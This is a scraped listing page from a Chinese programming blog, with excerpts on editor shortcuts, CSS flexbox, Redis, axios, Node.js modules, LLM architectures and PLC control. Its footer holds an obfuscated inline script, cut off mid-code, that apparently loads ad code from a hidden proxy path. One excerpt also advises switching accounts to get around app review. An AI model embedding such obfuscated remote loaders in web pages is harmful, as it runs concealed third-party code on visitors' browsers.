卫生安全文件：针对特定类型的危险品，可能需要提供有关健康和安全方面的文件，以确保货物的合规运输。
应急响应计划：公司需要制定并携带危险品拖车运输的应急响应计划，以在事故或紧急情况发生时采取适当的措施。
箱讯科技立足于国际物流供应链管理服务平台，团队自主研发国际货代SAAS系统，致力于成为顶尖的国际物流数字化基础设施供应商，以科技驱动国际物流创新发展，打造国际物流全链路数智化服务平台，为客户提供专业化透明化高效高性价比的全球供应链整合解决方案，以及端到端可见性和可控性的国际物流服务。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/517f462df5a61ea5ee85cc9593fd1a06/" rel="bookmark">
			Sublime Text快捷命令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		到页面底部：Ctrl + End 这个快捷键可以将光标移动到当前页面的底部。
到页面顶部：Ctrl + Home 这个快捷键可以将光标移动到当前页面的顶部。
批量注释：Ctrl + / (Windows/Linux) 或 Cmd + / (Mac) 这个快捷键可以在选中的行上添加或删除注释。如果没有选中任何内容，则会在光标所在行添加或删除注释。
多行编辑：Ctrl + Shift + L (Windows/Linux) 或 Cmd + Shift + L (Mac) 这个快捷键可以将光标放在多个位置，使您可以同时编辑多个位置的文本。按下快捷键后，您可以在需要编辑的位置放置光标，然后键入要添加的文本。
多行选择：Ctrl + D (Windows/Linux) 或 Cmd + D (Mac) 这个快捷键可以根据当前选择的单词或文本项，依次选择下一个相同的单词或文本项。按下快捷键后，您可以继续按下相同的快捷键以选择下一个相同的单词或文本项。
复制一行：Ctrl + Shift + D (Windows/Linux) 或 Cmd + Shift + D (Mac) 这个快捷键可以复制当前所在行的内容，并将其粘贴到下一行。
打开命令面板：Ctrl + Shift + P (Windows/Linux) 或 Cmd + Shift + P (Mac) 这个快捷键可以打开Sublime Text的命令面板，您可以在面板中输入命令或关键字来执行各种操作，比如切换语法、安装插件、执行操作等。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/517f462df5a61ea5ee85cc9593fd1a06/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7b293583514a1554c054a92c8a082c17/" rel="bookmark">
			CSS新手入门笔记整理：CSS3弹性盒模型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		特点 子元素宽度之和小于父元素宽度，所有子元素最终的宽度就是原来定义的宽度。子元素宽度之和大于父元素宽度，子元素会按比例来划分宽度。在使用弹性盒子模型之前，必须为父元素定义“display:flex;”或“display:inline-flex;”。 弹性盒子模型属性
属性
说明
flex-grow
定义子元素的放大比例
flex-shrink
定义子元素的缩小比例
flex-basis
定义子元素的宽度
flex
flex-grow、flex-shrink、flex-basis 的复合属性
flex-direction
定义子元素的排列方向
flex-wrap
定义子元素是单行显示，还是多行显示
flex-flow
flex-direction、flex-wrap的复合属性
order
定义子元素的排列顺序
justify-content
定义子元素在“横轴”上的对齐方式
align-items
定义子元素在上的对齐方式“纵轴”
放大比例：flex-grow flex-grow属性用来定义弹性盒子内部子元素的放大比例。当所有子元素宽度之和小于父元素的宽度时，子元素如何分配父元素的剩余空间。
语法
父元素{display:flex;} 子元素{flex-grow: 数值;} flex-grow属性取值是一个数值，默认值为0。当取值为0时，表示不索取父元素的剩余空间；当取值大于0时，表示索取父元素的剩余空间（即子元素放大）。取值越大，索取得越多。
缩小比例：flex-shrink flex-shrink属性用于定义弹性盒子内部子元素的缩小比例。当所有子元素宽度之和大于父元素的宽度时，子元素如何缩小自己的宽度。
语法
父元素{display:flex;} 子元素{flex-shrink: 数值;} flex-shrink属性取值是一个数值，默认值为1。当取值为0时，表示子元素不缩小；当取值大于1时，表示子元素按一定的比例缩小。取值越大，缩小得越厉害。
元素宽度：flex-basis flex-basis属性用于定义弹性盒子内部的子元素在分配空间之前，该子元素所占的空间大小。浏览器会根据这个属性，计算父元素是否有多余空间。flex-basis相当于width，用来定义子元素的宽度。在弹性盒子中，flex-basis的语义会比width更好。如果某一个子元素同时设置flex-basis和width，那么flex-basis的值会覆盖width的值。 语法
父元素{display:flex;} 子元素{flex-basis: 取值;} flex-basis属性取值有两个：一个是“auto”，即该子元素的宽度是根据内容多少来定的；另一个是“长度值”，单位可以为px、em和百分比等。
复合属性：flex flex属性可以同时设置flex-grow、flex-shrink、flex-basis这3个属性。
语法
父元素{display:flex;} 子元素{flex: grow shrink basis;} 参数grow是flex-grow的取值，参数shrink是flex-shrink的取值，参数basis是flex-basis的取值。flex属性的默认值为“0 1 auto”。
排列方向：flex-direction flex-direction属性用来来定义弹性盒子内部“子元素”的排列方向。即定义子元素是横着排，还是竖着排。flex-direction属性是在弹性盒子（即父元素）上定义的。 语法
父元素{ display:flex; flex-direction: 取值; } flex-direction属性取值
属性值
说明
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7b293583514a1554c054a92c8a082c17/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e3e9fdfe3655185313ed7c2d4032467e/" rel="bookmark">
			如何用matlab制作游戏？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在MATLAB中制作游戏可以采用图形用户界面（GUI）或使用MATLAB的绘图和交互功能。以下是一些制作游戏的基本步骤：
使用 MATLAB GUI 制作游戏 打开 GUIDE（GUI 开发环境） 打开 MATLAB 并在命令行中输入 guide 打开 GUIDE。
设计 GUI
在 GUIDE 工具中，设计游戏窗口，按钮，文本框等 GUI 元素。设计用户界面以容纳游戏元素，例如游戏板，玩家角色等。 编写回调函数
为按钮、菜单等 GUI 元素编写回调函数。在回调函数中添加游戏逻辑，处理用户输入并更新游戏状态。 添加图形元素
使用 MATLAB 绘图函数（例如plot、imshow）在 GUI 中添加游戏图形元素。 处理用户输入
使用 MATLAB 的事件处理机制处理用户输入。例如，可以在按钮按下时触发相应的事件。 更新游戏状态
在回调函数中更新游戏状态，例如移动玩家，检测碰撞等。使用drawnow函数刷新 GUI，以显示更新后的游戏状态。 使用 MATLAB 绘图函数制作游戏 初始化游戏环境
在 MATLAB 脚本中初始化游戏环境，设置游戏参数，创建游戏图形等。 游戏主循环
创建一个主循环，用于持续更新游戏状态和图形。在主循环中使用figure和绘图函数（例如plot、imshow）来显示游戏图形。 处理用户输入
使用 MATLAB 的waitforbuttonpress等函数处理用户输入。 更新游戏状态
在主循环中更新游戏状态，例如移动玩家，检测碰撞等。 刷新图形
使用drawnow函数刷新图形，以显示更新后的游戏状态。 游戏结束条件
在游戏主循环中添加结束条件，例如玩家达到一定分数或游戏时间结束。 这只是一个简单的游戏制作流程，具体取决于你想创建的游戏类型。MATLAB 并非专门用于游戏开发，但它仍然可以用于制作简单的图形游戏。如果你希望开发更复杂的游戏，可能需要考虑使用专业的游戏开发工具和语言。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7566c31f582ceaab64c359e323964886/" rel="bookmark">
			Redis单线程的正确理解（一）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Redis实战精讲-13小时彻底学会Redis
一、Redis的单线程理解
Redis客户端对服务端的每次调用都经历了发送命令，执行命令，返回结果三个过程。其中执行命令阶段，由于Redis是单线程来处理命令的，所有到达服务端的命令都不会立刻执行，所有的命令都会进入一个队列中，然后逐个执行，并且多个客户端发送的命令的执行顺序是不确定的，但是可以确定的是不会有两条命令被同时执行，不会产生并发问题，这就是Redis的单线程基本模型。
Redis服务器通过socket（套接字）与客户端或其他Redis服务器进行连接，而文件事件就是服务器对socket操作的抽象。服务器与客户端或其他服务器的通信会产生相应的文件事件，而服务器通过监听并处理这些事件来完成一系列网络通信操作。
Redis基于Reactor模式开发了自己的网络事件处理器——文件事件处理器，文件事件处理器使用I/O多路复用程序来同时监听多个socket（I/O多路复用技术下面有介绍），并根据socket目前执行的任务来为socket关联不同的事件处理器。当被监听的socket准备好执行连接应答、读取、写入、关闭等操作时，与操作相对应的文件事件就会产生，这时文件事件处理器就会调用socket之前已关联好的事件处理器来处理这些事件。
二、I/O多路复用技术
关于I/O多路复用(又被称为“事件驱动”)，首先要理解的是，操作系统为你提供了一个功能，当你的某个socket可读或者可写的时候，它可以给你一个通知。这样当配合非阻塞的socket使用时，只有当系统通知我哪个描述符可读了，我才去执行read操作，可以保证每次read都能读到有效数据而不做纯返回-1和EAGAIN的无用功，写操作类似。
操作系统的这个功能是通过select/poll/epoll/kqueue之类的系统调用函数来实现，这些函数都可以同时监视多个描述符的读写就绪状况，这样，多个描述符的I/O操作都能在一个线程内并发交替地顺序完成，这就叫I/O多路复用，这里的“多路”指的是多个网络连接，“复用”指的是复用同一个Redis处理线程。
采用多路 I/O 复用技术可以让单个线程高效的处理多个连接请求（尽量减少网络 I/O 的时间消耗），且 Redis 在内存中操作数据的速度非常快，也就是说内存内的操作不会成为影响Redis性能的瓶颈，所有 Redis 具有很高的吞吐量。
三、常见疑问解答
1、Redis的单线程为什么这么快？
完全基于内存，绝大部分请求是纯粹的内存操作，非常快速。数据存在内存中，类似于HashMap，HashMap的优势就是查找和操作的时间复杂度都是O(1)；数据结构简单，对数据操作也简单，Redis中的数据结构是专门进行设计的；采用单线程，避免了不必要的上下文切换和竞争条件，也不存在多进程或者多线程导致的切换而消耗
CPU，不用去考虑各种锁的问题，不存在加锁释放锁操作，没有因为可能出现死锁而导致的性能消耗；使用多路I/O复用模型，非阻塞I/O；Redis直接自己构建了VM 机制 ，因为一般的系统调用系统函数的话，会浪费一定的时间去移动和请求； 2、为什么不采用多进程或多线程处理？
多线程处理可能涉及到锁
多线程处理会涉及到线程切换而消耗CPU
3、单线程处理的缺点？
耗时的命令会导致并发的下降，不只是读并发，写并发也会下降
无法发挥多核CPU性能，不过可以通过在单机开多个Redis实例来完善
4、Redis不存在线程安全问题？
Redis采用了线程封闭的方式，把任务封闭在一个线程，自然避免了线程安全问题，不过对于需要依赖多个redis操作（即：多个Redis操作命令）的复合操作来说，依然需要锁，而且有可能是分布式锁。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d965e4ce76173d7050eacaed25e7fbaa/" rel="bookmark">
			讲解Ajax和axios相关知识
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 🌹简述Ajax⭐作用 🎄异步请求&amp;&amp;同步请求⭐同步⭐异步 🎆原生Ajax(复杂，不建议使用，可以帮助理解)🛸axios🎍axios入门🎈代码实现 🌹简述Ajax Ajax（Asynchronous JavaScript and XML）是一种网页开发技术，通过使用 JavaScript 和 XML（现在更常用的是 JSON）实现在不重新加载整个页面的情况下更新部分页面内容的功能。相比传统的同步请求方式，Ajax 可以异步地向服务器发送请求并接收响应，使得用户可以在无需等待页面全部加载完成的情况下获取该页面部分数据的更新。
⭐作用 实时更新：通过 Ajax 技术，网页可以在不刷新整个页面的情况下，动态地更新部分内容，如加载新的数据、评论、消息等。这种实时更新可以大大提高用户体验，减少用户等待时间。表单验证：使用 Ajax 技术可以实现表单的即时验证，当用户填写完表单的某一项内容后，可以立即向服务器发送请求进行验证，而不需要等待整个表单提交后才得到反馈。动态加载：当需要动态加载内容时，比如在网页滚动到底部时自动加载更多内容，或者通过搜索框输入关键词后自动展示相关内容，都可以通过 Ajax 技术实现。提升响应速度：由于 Ajax 可以异步请求数据，因此网页可以在后台获取数据的同时继续响应用户的操作，提升了网页的响应速度。 🎄异步请求&amp;&amp;同步请求 ⭐同步 简而言之，同步就是我们点击某个超链接之类的操作
⭐异步 我们在浏览器输入的时候，比如我们输入Java，下面就会自动出来一些关于Java的词条，但是现在浏览器没有刷新，这就是异步操作
🎆原生Ajax(复杂，不建议使用，可以帮助理解) 原生Ajax
首先我们要准备一个数据地址http://yapi.smart-xwork.cn/mock/169327/emp/list，然后写入下面的代码
但是我们发现这种方法太复杂了，不利于我们开发使用
下面我们介绍一种简单的方法，axios
🛸axios axios就是对原生的Ajax进行了封装，简化书写
官网https://www.axios-http.cn/
Axios 主要有以下特点：
基于 Promise 实现： Axios 提供的 API 返回的是 Promise 对象，使得异步请求更加方便和可读。
支持拦截器： 支持请求和响应拦截器，可以在请求被发送或响应被接收之前对其进行拦截和修改，可用于设置公共请求头、loading 状态提示、错误处理等。
支持并发请求：可以一次性发起多个请求，并且在所有请求完成后返回结果。
自动转换数据类型：Axios 能够根据响应数据类型自动转换为 JSON 对象。
支持取消请求：Axios 支持取消请求，可以在请求未完成时中断请求。
🎍axios入门 🎈代码实现 首先引入js文件
/* axios v0.18.0 | (c) 2018 by Matt Zabriskie */ !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d965e4ce76173d7050eacaed25e7fbaa/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0cbaad8f8d0b4318af0f0576ad753abb/" rel="bookmark">
			[node]Node.js 模块系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		[node]模块系统 Node.js中的模块系统模块的使用模块的导入模块的导出导出多个值导出默认值导出可传参的函数 文件查找策略从文件模块缓存中加载从原生模块加载从文件加载 Node.js中的模块系统 为了让Node.js的文件可以相互调用，Node.js提供了一个简单的模块系统。
模块是Node.js 应用程序的基本组成部分，文件和模块是一一对应的。换言之，一个 Node.js 文件就是一个模块，这个文件可能是JavaScript 代码、JSON 或者编译过的C/C++ 扩展。
模块的使用 Node.js 提供了 exports 和 require 两个对象，其中 exports 是模块公开的接口，require 用于从外部获取一个模块的接口，即所获取模块的 exports 对象。
常用的关键字包括：
exportsmodulerequire exports是module.exports的别名,一般要对外暴露属性或方法，就用 exports 就行，要暴露对象(类似class，包含了很多属性和方法)，就用 module.exports
不建议同时使用 exports 和 module.exports。
如果先使用 exports 对外暴露属性或方法，再使用 module.exports 暴露对象，会使得 exports 上暴露的属性或者方法失效。
原因在于，exports 仅仅是 module.exports 的一个引用
模块的导入 Nodejs主要是通过require的方式导入；
模块的导出 导出多个值 module.js
//方式1 exports.a="this is a module param,"; exports.b="use exports to export param,"; exports.c="check the result"; module-use.js,使用模块：
const receive=require("./module"); console.log(receive.a,receive.b,receive.c); 终端打印：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0cbaad8f8d0b4318af0f0576ad753abb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2243141e8eb960a837bc7f253fbaa89b/" rel="bookmark">
			微信小程序审核过慢有什么辅助方法吗？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		加急审核
微信小程序加急审核一年有3次机会可使用
以下仅为建议方法
换个开发人员账号重新提交新版本审核
有时候审核失败，审核会变得严格，以前没有的问题也会被拎出来，不得不再次修改代码提交审核，建议换个账号，否则继续同个账号提交不仅更慢且容易审核失败。
小程序首次提交审核容易通过
小程序首次提交第一版审核容易通过，建议通过后没什么大问题，就直接发布到线上，上线后再次修改代码后提交审核，审核通过后，没有发布到线上，再次提交审核极其容易遭遇审核失败，长时间且严格的审核。
查看服务类目是否没有主营类目，需设置主营类目
登录微信开发者平台-设置-服务类别
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1084b6d6b0afc7ca899c60fa750411e4/" rel="bookmark">
			大语言模型的三种主要架构 Decoder-Only、Encoder-Only、Encoder-Decoder
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		现代大型语言模型（LLM）的演变进化树，如下图：
https://arxiv.org/pdf/2304.13712.pdf
基于 Transformer 模型以非灰色显示：
decoder-only 模型在蓝色分支，
encoder-only 模型在粉色分支，
encoder-decoder 模型在绿色分支。
模型在时间线上的垂直位置表示它们的发布日期。
开源模型由实心方块表示，而闭源模型由空心方块表示。
右下角的堆积条形图显示了各公司和机构的模型数量。
从时间轴上，我们可以看到：
2021年前，当 OpenAI 决定在 GPT 系列中采用 Decoder-Only 架构时，他们实际上是在逆流而上。在那个时代，Encoder-Decoder 架构，如在 BART 和 Transformer 模型中见到的，是技术巨头和学术界的宠儿，而 Decoder-Only 架构当时被视为一条不被主流认可的小径。
然而，正是这种冒险的选择催生了一个突破性的产品——ChatGPT。它不仅挑战了当时的技术共识，还引领了一个全新的对话生成和文本续写的潮流。ChatGPT 展现的生成连贯、流畅和相关文本的能力，彻底颠覆了业界对 Decoder-Only 架构的看法，将其从一个被边缘化的选择转变为人工智能研究的前沿。
大语言模型常见架构 大语言模型如GPT系列（包括GPT-4）通常采用不同的架构，主要有三种：Decoder-Only、Encoder-Only、以及Encoder-Decoder。每种架构都有其独特的特点和适用场景：
1. Decoder-Only 架构(GPT) 这就像一个讲故事的人。你给他一个开头，比如“有一次，一只小猫走失了”，然后他会继续这个故事，讲述下去，一直到故事结束。
Decoder-Only模型就是这样，它接收一些信息（开头），然后生成接下来的内容（故事）。
特点：擅长创造性的写作，比如写小说或自动生成文章。它更多关注于从已有的信息（开头）扩展出新的内容。
OpenAI 选择了Decder-Only方案（如GPT系列），因为它对于自然语言生成特别有效。这种架构能够更好地理解和预测语言模式，尤其适合处理开放式的、生成性的任务。
2. Encoder-Only 架构（BERT） 这就像是一个专业的书评家。他阅读和理解一本书（输入的信息），然后告诉你这本书是关于什么的，比如它的主题是爱情、冒险还是悬疑。
Encoder-Only模型就是专注于理解和分析输入的信息，而不是创造新的内容。
特点：擅长理解和分类信息，比如判断一段文本的情感倾向（积极还是消极）或者主题分类。
这种架构主要用于处理输入数据，专注于理解和编码信息，而不是生成新的文本。
Encoder-Only模型在理解和分类任务中更为有效，例如文本分类、情感分析等。
3. Encoder-Decoder 架构（如BART、T5） 这就像是翻译家。他先听你说一段话（比如英文），理解它，然后把它翻译成另一种语言（比如中文）。
Encoder-Decoder模型就是这样，先理解输入的信息（Encoder部分），然后基于这个理解生成新的、相关的内容（Decoder部分）。
特点：擅长处理需要理解输入然后生成相关输出的任务，比如翻译或问答系统。
这种模型在需要深入理解输入内容并生成相关响应的任务中表现良好，例如机器翻译、问答系统等。
从上面的介绍，我们可以看到，三种架构都有其适用场景，那为啥OpenAI选择的Decoder-Only大获成功呢？因为：
理解自然语言是通往通用人工智能（AGI）的关键路径 语言是人类智能的一个核心表现。通过有效地处理和生成自然语言，人工智能系统可以更好地理解人类的意图、情感和知识，这是通向AGI的重要一步。
想象一下，语言就像是一座桥。这座桥连接着人类的思维世界与外部世界。当人们交流时，他们实际上是在这座桥上相遇，通过语言的桥梁来分享思想、情感和知识。
现在，设想人工智能（AI）像是一位初到陌生城市的旅者。最开始，这位旅者可能只懂得一些基本的词汇和短语，类似于旅游手册里的内容。随着时间的推移，如果他开始学习当地的语言，了解当地的文化和习俗，他就能更深入地理解这座城市，甚至能够与当地人进行深层次的交流。在这个过程中，这位旅者不仅学会了如何使用语言，还学会了理解当地人的想法、情感和行为方式。
把这个比喻应用到AI上，刚开始，AI就像是只懂得基础语言的旅者。但随着它学习和理解更多的自然语言，它就能更好地理解人类的意图、情感和复杂思想。这种深入的理解能力是通往通用人工智能（AGI）的桥梁，因为它不仅帮助AI理解语言本身，还帮助它理解使用这种语言的人类社会和文化。图：语言就像是一座桥.就像一个逐渐融入新城市的旅者，AI通过学习语言，能够逐渐理解并参与人类的世界。
从语言突破，较少的计算量 OpenAI首席科学家Ilya Sutskever有句话:
“语言是人类知识的压缩”
对比视觉和声音，语言的压缩比要高很多。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/18630728b481db1ea51ad8393c6cefeb/" rel="bookmark">
			企业直聘招聘人才求职系统招聘会小程序系统源码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		技术栈：
端 原生小程序开发 + 后端php7.2 + 数据库mysql5.6
主要功能：
企业入住 ,企业直聘
个人实名认证，人才求职
发布线上招聘会
企业招聘邀请
个人简历置顶 刷新
浏览足迹浏览
附近 招聘信息查看
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0fb0d91dd2245798ee375db2c5517c0e/" rel="bookmark">
			基于200SMART为控制器的无线上水通信方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文就1主6从无线上水应用方案，详细描述了plc与多点集群组网无线开关量测控终端--DTD433HE的通讯链路的搭建。
一、现场情况描述
水源地水池旁有一台采用自耦减压器来控制的水泵，负责给6个分散水池供水，每个水池旁都配有220V/40W电磁阀，分散水池端无电源。泵房到水池最远距离在5公里左右。
要实现功能：当任意一个水池缺水或水满采用无线自动控制泵启停。供水方式每次只能给一个水池供水。
解决方案:水池端都采用太阳能供电，内置逆变器转220V交流给电磁阀供电。每个水池投放一个浮球液位计，配从站DTD433HE-2DI/2DO，采用无线485MODBUS通讯方式将液位信号传输到泵房PLC上。实现的是1主6从无线通讯。
PLC内部运行逻辑功能：PLC采用无线方式轮询下面6个水池高低液位，当采集到有1个水池缺水或多个水池缺水，先打开指定的1个水池的阀门。这时PLC输出开关信号驱动泵启动，给指定1个水池上水。当水池水满在检测下一个水池液位。按照顺序一一供水，最终确保每个水池都有水。
▼PLC完成功能▼
1.轮询检测6个水池液位高低状态，然后判断是否启停泵。（起泵原则:先开阀，在起泵）(停泵原则：先停泵在关阀）
2.给6个水池供水按照顺序依次供水，供水只能依次给一个水池供水。
3.PLC要采集泵房就地水池液位，当泵房就地水池缺水，即使下面6个水池有些要供水这时泵不能启动。（原则：水源地低液位，优先停泵）
二、PLC编程逻辑
Plc作为此次方案的中央逻辑部件，担负着整个一主六从无线上水系统的核心，plc也具有可靠性高、抗干扰能力强的特点，因此优先选用。为方便读者理解，现将plc整个编程逻辑以程序流程图的形式展示给大家，程序流程图具体如下：
三、搭建链路下载程序并实验
依照上文图示，连接相应的通信模块，将plc程序下载到s7-200SMART中，利用s7-200SMART的485通信口连接在DTD433ME的相应通信口上，搭建起整个通信链路。我司拥有成套的无线通讯终端与plc集成的箱体，用户可直接接通电源即可使用。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/08a966ef2e4e700510ff8c6aabd599c5/" rel="bookmark">
			hive高级查询
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		-- 查询语句
SELECT 5,"student",88.5;
SELECT * FROM student;
SELECT name,id,id,name FROM student WHERE id&gt;1002;
SELECT * FROM student limit 2;【注意：只能有一个参数】
SELECT * FROM student WHERE name rlike '(j|r).*';
SELECT sex,avg(mark) FROM score GROUP BY sex;
SELECT sex,avg(mark) avg_mark FROM score GROUP BY sex HAVING avg_mark&gt;79;
SELECT id,name FROM (
SELECT id,name FROM (
SELECT id,name FROM student) t
) t;
-- CTE【Common Table Expression，公共表表达式】
WITH t1 AS(
SELECT id,name FROM student
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/08a966ef2e4e700510ff8c6aabd599c5/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/33/">«</a>
	<span class="pagination__item pagination__item--current">34/578</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/35/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e09